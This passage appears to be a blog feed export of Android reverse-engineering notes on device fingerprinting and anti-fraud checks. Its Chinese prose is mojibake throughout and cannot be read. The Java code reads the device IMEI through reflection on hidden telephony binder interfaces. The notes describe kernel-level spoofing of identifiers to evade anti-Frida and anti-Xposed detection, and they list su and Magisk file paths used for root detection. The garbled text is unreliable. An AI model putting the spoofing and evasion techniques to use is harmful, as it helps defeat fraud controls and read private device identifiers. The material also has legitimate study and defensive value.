ç”¨æ¥æ¥æ”¶è¿œç¨‹æœåŠ¡<strong>è¿”å›çš„</strong>æ•°æ®ï¼ŒåŒ…æ‹¬è¿”å›å€¼å’Œå¯èƒ½çš„å¼‚å¸¸ä¿¡æ¯</li><li><code>obtain()</code>: ä»ä¸€ä¸ªå…¨å±€æ± ä¸­è·å–å¯å¤ç”¨çš„ <code>Parcel</code> å¯¹è±¡ï¼Œä»¥æé«˜æ€§èƒ½ï¼Œé¿å…é¢‘ç¹åˆ›å»ºå’Œé”€æ¯å¯¹è±¡</li></ul></blockquote><p><strong>ç„¶åå†™å…¥æ¥å£æè¿°ç¬¦</strong> (<code>writeInterfaceToken</code>)ï¼Œ<code>_data.writeInterfaceToken(DESCRIPTOR)</code></p><p>å…¶ä¸­<code>DESCRIPTOR</code>æ˜¯å”¯ä¸€æ ‡è¯†å­—ç¬¦ä¸²</p><p>ä»£è¡¨äº†è¦è°ƒç”¨çš„æ¥å£ï¼ˆä¾‹å¦‚<code>&quot;com.android.internal.telephony.IPhoneSubInfo&quot;</code>ï¼‰ï¼Œåœ¨ <code>_data</code> åŒ…çš„æœ€å¼€å§‹å†™å…¥è¿™ä¸ªâ€œ<strong>ä»¤ç‰Œ</strong>â€ï¼Œè¿œç¨‹æœåŠ¡åœ¨æ”¶åˆ°æ•°æ®åä¼šé¦–å…ˆè¯»å–å¹¶éªŒè¯å®ƒï¼Œç¡®ä¿å®¢æˆ·ç«¯è¯·æ±‚çš„æ˜¯æ­£ç¡®çš„æœåŠ¡æ¥å£ï¼Œé˜²æ­¢è°ƒç”¨æ··ä¹±</p><p><strong>ä¹‹åå†™å…¥æ–¹æ³•å‚æ•°</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!TextUtils.isEmpty(callingPackage)) &#123;</span><br><span class="line">    _data.writeString(callingPackage);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°† <code>getDeviceId</code> æ–¹æ³•æ‰€éœ€çš„å‚æ•°å†™å…¥ <code>_data</code> åŒ…ï¼Œæ­¤æ—¶å‚æ•°æ˜¯é€šè¿‡<code>context.getPackageName()</code>è·å–ï¼Œå³æ˜¯è°ƒç”¨æ–¹çš„åŒ…å</p><ul><li>å¦‚æœ <code>callingPackage</code> ä¸ä¸ºç©ºï¼Œå°±å°†å…¶å†™å…¥ <code>_data</code>ï¼Œå¯¹åº” <code>getDeviceId(String pkg)</code> è¿™ç§æ–¹æ³•ç­¾åã€‚</li><li>å¦‚æœ <code>callingPackage</code> ä¸ºç©ºï¼Œå°±ä¸å†™å…¥ä»»ä½•ä¸œè¥¿ï¼Œå¯¹åº” <code>getDeviceId()</code> è¿™ç§æ— å‚çš„æ–¹æ³•ç­¾åã€‚</li></ul><p><strong>å‘èµ·è¿œç¨‹äº‹åŠ¡ (<code>transact</code>)</strong></p><ul><li><code>remote.transact(tid, _data, _reply, 0);</code></li></ul><p>è¿™æ˜¯æ•´ä¸ªè¿‡ç¨‹çš„æ ¸å¿ƒï¼Œå®ƒçœŸæ­£åœ°å‘èµ·äº†è·¨è¿›ç¨‹è°ƒç”¨ã€‚</p><p><code>remote</code>: è¿™æ˜¯ä» <code>ServiceManager</code> è·å–åˆ°çš„åŸå§‹ <code>IBinder</code> å¯¹è±¡ï¼ˆä¸€ä¸ª <code>BinderProxy</code> å®ä¾‹ï¼‰ï¼Œä»£è¡¨äº†é€šå¾€è¿œç¨‹æœåŠ¡çš„è¿æ¥é€šé“ã€‚</p><p><code>tid</code>å‚æ•°å°±æ˜¯<code>TransactionId</code>ï¼ˆäº‹åŠ¡idï¼‰ï¼Œç„¶å<code>_data</code>åŒ…å«æ¥å£ä»¤ç‰Œå’Œå‚æ•°çš„è¾“å…¥æ•°æ®åŒ…ï¼Œ<code>_reply</code>ç”¨äºæ¥æ”¶è¿”å›ç»“æœçš„ç©ºæ•°æ®åŒ…ï¼Œ<code>0</code>æ˜¯äº‹åŠ¡æ ‡å¿—ä½ï¼Œ<code>0</code> è¡¨ç¤ºè¿™æ˜¯ä¸€æ¬¡æ ‡å‡†çš„åŒæ­¥è°ƒç”¨ï¼Œæ–¹æ³•ä¼šé˜»å¡ç›´åˆ°è¿œç¨‹æœåŠ¡å¤„ç†å®Œæ¯•å¹¶è¿”å›ç»“æœ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    _reply.readException();</span><br><span class="line">    _result = _reply.readString();</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    _reply.recycle();</span><br><span class="line">    _data.recycle();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æœ€åå°±å¤„ç†è¿”å›ç»“æœå’Œå›æ”¶Parcelå¯¹è±¡äº†</strong></p><p>ä½†æ˜¯ä» <code>Android 10 (API 29)</code> å¼€å§‹ï¼Œè·å–æ˜¯å¯ä»¥æ­£å¸¸è·å–ï¼Œä½†æ˜¯å°±æ— æ³•æ­£å¸¸ä½¿ç”¨äº†</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TelephonyPermissions    com.android.phone                    W  reportAccessDeniedToReadIdentifiers:com.sheep.anti:getDeviceId:-1</span><br></pre></td></tr></table></figure><p>ä¼šæŠ¥é”™è¯¯æ˜¾ç¤ºæ²¡æƒé™è®¿é—®</p><h4 id="Level1"><a href="#Level1" class="headerlink" title="Level1"></a>Level1</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getDeviceIdLevel1</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">ServiceManager</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.os.ServiceManager&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getService</span> <span class="operator">=</span> ServiceManager.getDeclaredMethod(<span class="string">&quot;getService&quot;</span>, String.class);</span><br><span class="line">        getService.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">IBinder</span> <span class="variable">binder</span> <span class="operator">=</span> (IBinder) getService.invoke(<span class="literal">null</span>, <span class="string">&quot;iphonesubinfo&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">Stub</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.android.internal.telephony.IPhoneSubInfo$Stub&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">asInterface</span> <span class="operator">=</span> Stub.getDeclaredMethod(<span class="string">&quot;asInterface&quot;</span>, IBinder.class);</span><br><span class="line">        asInterface.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">binderProxy</span> <span class="operator">=</span> asInterface.invoke(<span class="literal">null</span>, binder);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Method</span> <span class="variable">getDeviceId</span> <span class="operator">=</span> binderProxy.getClass().getDeclaredMethod(<span class="string">&quot;getDeviceId&quot;</span>, String.class);</span><br><span class="line">            <span class="keyword">if</span> (getDeviceId != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> (String) getDeviceId.invoke(binderProxy, context.getPackageName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getDeviceId</span> <span class="operator">=</span> binderProxy.getClass().getDeclaredMethod(<span class="string">&quot;getDeviceId&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (getDeviceId != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> (String) getDeviceId.invoke(binderProxy);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="comment">//();</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°±æ˜¯ç›´æ¥è°ƒç”¨<code>com.android.internal.telephony.IPhoneSubInfo$Stub$Proxy-&gt;getDeviceId</code>æ–¹æ³•</p><h4 id="Level0"><a href="#Level0" class="headerlink" title="Level0"></a>Level0</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getDeviceIdLevel0</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">    <span class="type">TelephonyManager</span> <span class="variable">telephonyManager</span> <span class="operator">=</span> ((TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE));</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> TelephonyManager.class.getDeclaredMethod(<span class="string">&quot;getSubscriberInfo&quot;</span>);</span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">binderProxy</span> <span class="operator">=</span> method.invoke(telephonyManager);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Method</span> <span class="variable">getDeviceId</span> <span class="operator">=</span> binderProxy.getClass().getDeclaredMethod(<span class="string">&quot;getDeviceId&quot;</span>, String.class);</span><br><span class="line">            <span class="keyword">if</span> (getDeviceId != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> (String) getDeviceId.invoke(binderProxy, context.getPackageName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getDeviceId</span> <span class="operator">=</span> binderProxy.getClass().getDeclaredMethod(<span class="string">&quot;getDeviceId&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (getDeviceId != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> (String) getDeviceId.invoke(binderProxy);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="comment">//();</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡<code>getSubscriberInfo</code>è·å–å…¶ä»£ç†å¯¹è±¡ï¼Œå‰©ä¸‹æ­¥éª¤éƒ½å·®ä¸å¤šäº†</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;æœ¬æ–‡çš„é¡¹ç›®æ¥è‡ªäº&lt;a href=&quot;https://github.com/happylishang/AntiFakerAndroidCheck</summary>
      
    
    
    
    <category term="å®‰å“é€†å‘" scheme="http://s1nec-1o.github.io/categories/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91/"/>
    
    
    <category term="android" scheme="http://s1nec-1o.github.io/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>Androidé€†å‘ä»å…¥é—¨åˆ°å…¥åœŸä¹‹åˆè¯†é£æ§(2)</title>
    <link href="http://s1nec-1o.github.io/2025/10/21/Android%E9%80%86%E5%90%91%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E4%B9%8B%E5%88%9D%E8%AF%86%E9%A3%8E%E6%8E%A7-2/"/>
    <id>http://s1nec-1o.github.io/2025/10/21/Android%E9%80%86%E5%90%91%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E4%B9%8B%E5%88%9D%E8%AF%86%E9%A3%8E%E6%8E%A7-2/</id>
    <published>2025-10-21T14:17:54.000Z</published>
    <updated>2025-10-21T14:22:50.429Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ¬æ–‡å‡ ä¹éƒ½æ˜¯æ¥è‡ªäº<strong>çæƒœanyå¤§ä½¬</strong>çš„æ–‡ç« ï¼Œä¸»è¦æ˜¯ä½œä¸ºå°ç™½çš„å­¦ä¹ è®°å½•</p><p>åŸæ–‡ï¼š</p><p><a href="https://bbs.kanxue.com/thread-273838.htm">https://bbs.kanxue.com/thread-273838.htm</a></p><p><a href="https://bbs.kanxue.com/thread-273759.htm">https://bbs.kanxue.com/thread-273759.htm</a></p><p><a href="https://bbs.kanxue.com/thread-277402.htm">https://bbs.kanxue.com/thread-277402.htm</a></p><p><a href="https://bbs.kanxue.com/thread-277637.htm">https://bbs.kanxue.com/thread-277637.htm</a></p><p>å…¶ä¸­ä¸€äº›è¾ƒä¸ºéš¾æ‡‚çš„ï¼ˆå…¶å®æ˜¯æˆ‘çœ‹ä¸æ‡‚ï¼‰çš„ä»£ç éƒ½åšäº†åˆ†æçš„éšç¬”ï¼ˆå…¶å®æ˜¯AIï¼‰</p><h2 id="åŸºæœ¬æ¦‚å¿µ"><a href="#åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="åŸºæœ¬æ¦‚å¿µ"></a>åŸºæœ¬æ¦‚å¿µ</h2><h3 id="è®¾å¤‡æŒ‡çº¹ï¼ˆDevice-Fingerprintï¼‰"><a href="#è®¾å¤‡æŒ‡çº¹ï¼ˆDevice-Fingerprintï¼‰" class="headerlink" title="è®¾å¤‡æŒ‡çº¹ï¼ˆDevice Fingerprintï¼‰"></a>è®¾å¤‡æŒ‡çº¹ï¼ˆDevice Fingerprintï¼‰</h3><ul><li>è®¾å¤‡æŒ‡çº¹æ˜¯åº”ç”¨ç”¨æ¥è¯†åˆ«ä½ æ‰‹æœºçš„ä¸€ç§æŠ€æœ¯ï¼Œç±»ä¼¼äºç»™ä½ çš„è®¾å¤‡ä¸€ä¸ªâ€èº«ä»½è¯â€</li><li>å®ƒä¼šæ”¶é›†ä½ çš„ï¼š<strong>IMEIã€Android IDã€MACåœ°å€ã€è®¾å¤‡å‹å·ã€å±å¹•åˆ†è¾¨ç‡ç­‰</strong>ä¿¡æ¯</li><li>åº”ç”¨é€šè¿‡è¿™äº›ä¿¡æ¯æ¥è¯†åˆ«æ˜¯å¦æ˜¯åŒä¸€å°è®¾å¤‡ï¼Œç”¨äºé£æ§ã€é˜²ä½œå¼Šç­‰</li></ul><h3 id="Hook-Binder"><a href="#Hook-Binder" class="headerlink" title="Hook Binder"></a>Hook Binder</h3><ul><li>Binderæ˜¯Androidçš„<strong>æ ¸å¿ƒIPCï¼ˆè¿›ç¨‹é—´é€šä¿¡ï¼‰æœºåˆ¶</strong></li><li>åº”ç”¨è·å–è®¾å¤‡ä¿¡æ¯æ—¶ï¼Œéƒ½è¦é€šè¿‡Binderä¸ç³»ç»ŸæœåŠ¡é€šä¿¡</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">åº”ç”¨ â†’ Binder â†’ ç³»ç»ŸæœåŠ¡ï¼ˆè·å–IMEIç­‰ä¿¡æ¯ï¼‰</span><br><span class="line">       â†‘</span><br><span class="line">    Hookè¿™é‡Œæ‹¦æˆªå’Œä¿®æ”¹è¿”å›å€¼</span><br></pre></td></tr></table></figure><p><strong>ç¼ºç‚¹ï¼š</strong></p><ul><li>éœ€è¦åœ¨åº”ç”¨è¿›ç¨‹å†…æ³¨å…¥ä»£ç <strong>ï¼ˆäºŒæ¬¡æ‰“åŒ…æˆ–Xposed&#x2F;Fridaï¼‰</strong></li><li>ç•™ä¸‹å¾ˆå¤šç—•è¿¹<strong>ï¼ˆæ³¨å…¥ç‰¹å¾ã€Hookç‰¹å¾ï¼‰</strong></li></ul><h3 id="APatch-å†…æ ¸å±‚å¯¹æŠ—"><a href="#APatch-å†…æ ¸å±‚å¯¹æŠ—" class="headerlink" title="APatch - å†…æ ¸å±‚å¯¹æŠ—"></a>APatch - å†…æ ¸å±‚å¯¹æŠ—</h3><ul><li>æ–°ä¸€ä»£Rootæ–¹æ¡ˆï¼ŒåŸºäºå†…æ ¸æ¨¡å—</li><li>ç›¸æ¯”Magiskï¼Œå®ƒå¯ä»¥ç›´æ¥åœ¨å†…æ ¸å±‚è¿›è¡Œä¿®æ”¹</li></ul><blockquote><p>Magiskæ˜¯é€šè¿‡ä¿®æ”¹<code>/boot.img</code>ï¼Œåœ¨ç³»ç»Ÿå¯åŠ¨æ—¶æŒ‚è½½ç³»ç»Ÿæ–‡ä»¶ï¼Œæ¥è¾¾åˆ°rootçš„ç›®çš„</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ä¼ ç»ŸHookæµç¨‹ï¼š</span><br><span class="line">åº”ç”¨ â†’ [Hookæ¡†æ¶åœ¨åº”ç”¨å±‚æ‹¦æˆª] â†’ Binder â†’ ç³»ç»ŸæœåŠ¡ â†’ å†…æ ¸</span><br><span class="line"></span><br><span class="line">APatchæ–¹å¼ï¼š</span><br><span class="line">åº”ç”¨ â†’ Binder â†’ ç³»ç»ŸæœåŠ¡ â†’ [åœ¨å†…æ ¸å±‚ç›´æ¥æ‹¦æˆªå¹¶è¿”å›å‡æ•°æ®]</span><br></pre></td></tr></table></figure><p><strong>ä¼˜ç‚¹ï¼š</strong></p><ul><li>ç»•è¿‡åº”ç”¨å±‚çš„æ£€æµ‹ï¼ˆ<strong>åFridaã€åXposedæ£€æµ‹</strong>ï¼‰</li><li>åœ¨å†…æ ¸å±‚ä¿®æ”¹ï¼Œ<strong>åº”ç”¨å±‚å®Œå…¨æ— æ„ŸçŸ¥</strong></li></ul><blockquote><p>å¯¹æŠ—çš„æœ¬è´¨ï¼šè°åœ¨æ›´åº•å±‚ï¼Œè°å°±æœ‰ä¼˜åŠ¿</p></blockquote><p>é£æ§çš„å…¨ç§°åº”è¯¥æ˜¯é£é™©æ§åˆ¶ï¼Œä¸ºäº†è§£å†³å’Œé¢„é˜²å°†è¦å‘ç”Ÿï¼Œæˆ–è€…å¯èƒ½å‘ç”Ÿçš„ä¸€äº›å±é™©æƒ…å†µï¼Œä»è€Œå‡è½»æŸå¤±ã€‚</p><h2 id="é£æ§æ¦‚è¿°"><a href="#é£æ§æ¦‚è¿°" class="headerlink" title="é£æ§æ¦‚è¿°"></a>é£æ§æ¦‚è¿°</h2><h3 id="èœœç½æ•°æ®"><a href="#èœœç½æ•°æ®" class="headerlink" title="èœœç½æ•°æ®"></a>èœœç½æ•°æ®</h3><p>ä»€ä¹ˆæ˜¯èœœç½æ•°æ®ï¼Ÿå½“å‘ç°ä½œå¼Šä»¥åè¿”å›çš„æ•°æ®æ˜¯<strong>éæ­£å¸¸çš„æ•°æ®</strong>ï¼Œå¯èƒ½å­˜åœ¨<strong>åŸ‹ç‚¹</strong>ç­‰ä¿¡æ¯ï¼Œ<strong>æ¯”å¦‚è§†é¢‘é‡Œé¢åœ¨éšæœºå¸§ç‡é‡Œé¢æ·»åŠ æ°´å°ï¼Œæˆ–è€…è¿”å›ä¸€äº›é”™è¯¯æ•°æ®æˆ–è€…é‡å¤çš„æ•°æ®</strong>ï¼Œè¿™äº›æ•°æ®å¾€å¾€æ˜¯å·²ç»è¢«æ±¡æŸ“æˆ–è€…è‚‰çœ¼æ— æ³•è¯†åˆ«æ˜¯å¦æ­£ç¡®ï¼Œä»è€Œ<strong>æ¬ºéª—æ”»å‡»è€…</strong>ã€‚</p><h3 id="IPé™åˆ¶ï¼š"><a href="#IPé™åˆ¶ï¼š" class="headerlink" title="IPé™åˆ¶ï¼š"></a>IPé™åˆ¶ï¼š</h3><p>è¿™ä¸ªä¸å¤šè¯´ï¼Œå½“æŸä¸€ä¸ªIPè¿‡é‡æˆ–è€…è¿‡å¿«è¯·æ±‚çš„æ—¶å€™ä¼šè¿›è¡Œé™åˆ¶ï¼Œè¿”å›é”™è¯¯çš„æ•°æ®æˆ–è€…è¿”å›èœœç½æ•°æ®ã€‚</p><blockquote><p>å¾ˆå¤šçˆ¬è™«ä¼šä¹°å…¥å¾ˆå¤šä»£ç†ï¼Œè¿™äº›ä»£ç†ä¹Ÿéƒ½æ˜¯ä¸å®‰å…¨çš„ï¼Œå¾ˆå¤šå¤§å‚ä¹Ÿä¼šä¹°å…¥ä¸€éƒ¨åˆ†ä»£ç†ï¼Œä»£ç†æ¯•ç«Ÿæ˜¯è°éƒ½å¯ä»¥ç”¨çš„ï¼Œä¹°å®Œä»¥ååœ¨æœåŠ¡ç«¯ç›´æ¥é…ç½®ä¸Šé»‘åå•å³å¯ï¼Œå¾ˆå¤šé»‘äº§æˆ–è€…æ”»å‡»è€…ä¼šé‡‡ç”¨æµé‡çš„æ–¹å¼è¿›è¡Œè¯·æ±‚ï¼Œå°†æ•°æ®è½¬å‘åˆ°è·¯ç”±å™¨ï¼Œä¸€ä¸ªç±»ä¼¼â€œçŒ«æ± â€çš„è·¯ç”±å™¨ï¼Œé‡Œé¢å†…ç½®å¾ˆå¤šæ‰‹æœºå¡ï¼Œå¯ä»¥é€šè¿‡è®¾ç½®ï¼Œå°†æ•°æ®é€šè¿‡å†…éƒ¨éšæœºæ‰‹æœºå¡è¿›è¡Œå‘é€è¯·æ±‚ï¼Œä»è€Œå®ç°åŠ¨æ€ä»£ç†ã€‚ä»è€Œè§„é¿ä¸€äº›IPé™åˆ¶çš„æ£€æµ‹ã€‚</p></blockquote><h3 id="è®¾å¤‡æŒ‡çº¹"><a href="#è®¾å¤‡æŒ‡çº¹" class="headerlink" title="è®¾å¤‡æŒ‡çº¹"></a>è®¾å¤‡æŒ‡çº¹</h3><p>è®¾å¤‡æŒ‡çº¹ä¸»è¦ä¸ºäº†è§£å†³å°±æ˜¯è®¾å¤‡çš„å”¯ä¸€æ€§ï¼Œé˜²æŠ¤æ–¹é€šè¿‡é‡‡é›†æ‰‹æœºçš„æŸäº›å­—æ®µï¼Œä»è€Œå®ç°å¾—åˆ°è®¾å¤‡å”¯ä¸€çš„æ ‡è¯†</p><p>å®¢æˆ·ç«¯çš„é‡‡é›†å‡†ç¡®ç¨‹åº¦ï¼Œæœ‰æ—¶å€™ä¹Ÿå¤§å¹…åº¦çš„å†³å®šäº†åç«¯ç­–ç•¥çš„é£æ§æ–¹å‘</p><p>è®¾å¤‡æŒ‡çº¹å”¯ä¸€IDï¼Œç›¸å½“äºç”¨æˆ·çš„<code>token</code> ï¼Œè®¾å¤‡æŒ‡çº¹çš„å‡†ç¡®æ€§å’Œå”¯ä¸€æ€§ï¼Œå†³å®šå®‰å…¨SDKçš„å¼ºåº¦</p><p><strong>å…¶æ£€æµ‹æ–¹å¼ä¹Ÿåªæ˜¯ä¸ºäº†æå‡æ”»å‡»è€…ç»•è¿‡çš„æˆæœ¬</strong></p><p>ä½†æ˜¯æ‰‹æœºé‡ç½®ä»¥åæˆ–è€…æ¢å¤å‡ºå‚è®¾ç½®ä»¥åï¼Œå¤§éƒ¨åˆ†å¤§å‚çš„è®¾å¤‡æŒ‡çº¹éƒ½æ— æ³•åšåˆ°è®¾å¤‡å”¯ä¸€æ€§çš„ç¡®è®¤</p><h3 id="Appç¯å¢ƒä¿¡æ¯"><a href="#Appç¯å¢ƒä¿¡æ¯" class="headerlink" title="Appç¯å¢ƒä¿¡æ¯"></a>Appç¯å¢ƒä¿¡æ¯</h3><p>å½“ç­–ç•¥æˆ–è€…é˜²æŠ¤å‘ç°æŸä¸ªtokenæˆ–è€…æŸä¸ªè®¾å¤‡å”¯ä¸€æ ‡è¯†å‡ºç°é—®é¢˜çš„æ—¶å€™ï¼Œå¯èƒ½ç¬¬ä¸€æ—¶é—´å°±æ˜¯å»æ£€æµ‹è¿™ä¸ªè®¾å¤‡çš„ç¯å¢ƒä¿¡æ¯ï¼Œç”¨äºæ˜¯å¦çŸ³é”¤å½“å‰ç”¨æˆ·æ˜¯å¦ä½œå¼Š</p><ul><li>æ­£å¸¸è®¾å¤‡ ï¼ˆå­—é¢å«ä¹‰ï¼Œæ­£å¸¸ç”¨æˆ·ä½¿ç”¨çš„è®¾å¤‡ï¼ŒæœåŠ¡ç«¯ä¿¡ä»»æ­¤è®¾å¤‡ï¼‰</li><li>ç°äº§è®¾å¤‡ ï¼ˆå¯èƒ½å­˜åœ¨ä½œå¼Šå¯èƒ½çš„è®¾å¤‡ï¼Œå½“æ‰‹æœºç¯å¢ƒå­˜åœ¨rootç­‰ï¼Œhookæ¡†æ¶ç­‰ï¼‰</li><li>é»‘äº§è®¾å¤‡ ï¼ˆå·²ç»è¢«çŸ³é”¤ä½œå¼Šçš„è®¾å¤‡ï¼‰</li></ul><p>å¸¸ç”¨çš„ç¯å¢ƒæ£€æµ‹ä¸»è¦åŒ…å«ä»¥ä¸‹å‡ éƒ¨åˆ†</p><h4 id="Rootæ£€æµ‹"><a href="#Rootæ£€æµ‹" class="headerlink" title="Rootæ£€æµ‹"></a>Rootæ£€æµ‹</h4><p><strong>ä¼ ç»Ÿæ£€æµ‹æ–¹æ³•ï¼š</strong>æ£€æµ‹suæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var suPaths = [</span><br><span class="line">    &quot;/system/bin/su&quot;,</span><br><span class="line">    &quot;/system/xbin/su&quot;,</span><br><span class="line">    &quot;/sbin/su&quot;</span><br><span class="line">];</span><br></pre></td></tr></table></figure><p><strong>ç°ä»£æ£€æµ‹æ–¹æ³•ï¼š</strong>Magiskæ£€æµ‹ï¼ŒLSPosed&#x2F;EdXposedæ£€æµ‹ï¼Œç³»ç»Ÿå±æ€§æ£€æµ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">// 1. æ£€æµ‹Magiskç‰¹å¾æ–‡ä»¶</span><br><span class="line">var magiskPaths = [</span><br><span class="line">    &quot;/sbin/.magisk&quot;,</span><br><span class="line">    &quot;/data/adb/magisk&quot;,</span><br><span class="line">    &quot;/data/adb/modules&quot;,</span><br><span class="line">    &quot;/cache/magisk.log&quot;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">// 2. æ£€æµ‹Magiskç«¯å£ï¼ˆé»˜è®¤ï¼šéšæœºç«¯å£ï¼‰</span><br><span class="line">// Nativeå±‚æ‰«æ /proc/net/tcp</span><br><span class="line"></span><br><span class="line">// 3. æ‰«æ/proc/self/mapså†…å­˜æ˜ å°„</span><br><span class="line">function checkMapsForMagisk() &#123;</span><br><span class="line">    // è¯»å– /proc/self/maps</span><br><span class="line">    // æŸ¥æ‰¾å…³é”®å­—ï¼šmagisk, zygisk, riru</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 4. æ£€æµ‹/proc/self/mountæŒ‚è½½ç‚¹</span><br><span class="line">function checkMountForMagisk() &#123;</span><br><span class="line">    // æ£€æµ‹tmpfsç­‰å¯ç–‘æŒ‚è½½</span><br><span class="line">&#125;</span><br><span 